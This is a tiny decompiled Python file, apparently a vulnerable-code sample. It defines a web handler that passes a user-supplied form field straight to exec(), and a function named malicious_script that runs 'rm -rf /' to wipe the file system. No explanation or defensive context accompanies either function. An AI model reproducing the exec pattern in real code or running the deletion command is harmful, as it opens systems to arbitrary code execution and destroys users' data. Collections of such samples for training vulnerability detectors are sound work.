# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 687_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 529 bytes


def execute_user_code():
    user_code = request.form.get("user_code")
    exec(user_code)


def malicious_script():
    import os
    os.system("rm -rf /")

# okay decompiling 687_1.pyc
